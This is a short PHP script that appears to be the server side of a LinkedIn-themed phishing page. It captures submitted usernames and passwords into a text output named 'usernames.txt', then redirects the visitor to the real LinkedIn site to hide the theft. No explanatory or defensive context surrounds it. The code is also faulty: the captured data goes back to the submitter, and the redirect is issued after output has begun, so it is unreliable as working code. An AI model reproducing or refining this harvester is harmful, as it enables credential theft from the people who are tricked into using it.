<?php
// Set headers for file download
header('Content-Disposition: attachment; filename="usernames.txt"');
header('Content-Type: text/plain');

// Open a file to write the username and password
$handle = fopen("php://output", "w");

if (isset($_POST['username']) && isset($_POST['password'])) {
    // Write username and password to the file
    fwrite($handle, "Username: " . $_POST['username'] . "\r\n");
    fwrite($handle, "Password: " . $_POST['password'] . "\r\n");
    fwrite($handle, "\r\n");
}

// Close the file handle
fclose($handle);

// Redirect to LinkedIn after processing
header("Location: https://www.linkedin.com/");
exit;
?>
